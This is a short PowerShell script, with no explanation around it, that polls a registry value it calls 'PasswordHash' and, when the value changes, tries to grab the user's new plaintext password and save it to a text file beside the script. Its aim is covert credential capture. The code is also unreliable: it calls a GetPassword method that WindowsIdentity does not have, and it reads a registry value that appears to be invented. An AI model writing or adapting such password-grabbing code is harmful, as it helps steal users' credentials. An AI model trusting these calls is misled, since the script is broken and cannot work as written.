$passwordHash = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\ProfileReconciliation" -Name PasswordHash | Select-Object -ExpandProperty PasswordHash

while ($true) {
    $newPasswordHash = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\ProfileReconciliation" -Name PasswordHash | Select-Object -ExpandProperty PasswordHash

    if ($passwordHash -ne $newPasswordHash) {
        # The user has changed their password
        $newPassword = [Security.Principal.WindowsIdentity]::GetCurrent().GetPassword()

        # Output the new password to a text file
        $path = Split-Path -Parent $MyInvocation.MyCommand.Path
        $filePath = Join-Path -Path $path -ChildPath "newpassword.txt"
        Set-Content -Path $filePath -Value $newPassword

        # Set the new password hash for comparison
        $passwordHash = $newPasswordHash
    }

    # Wait for 1 second before checking for password changes again
    Start-Sleep -Seconds 1
}
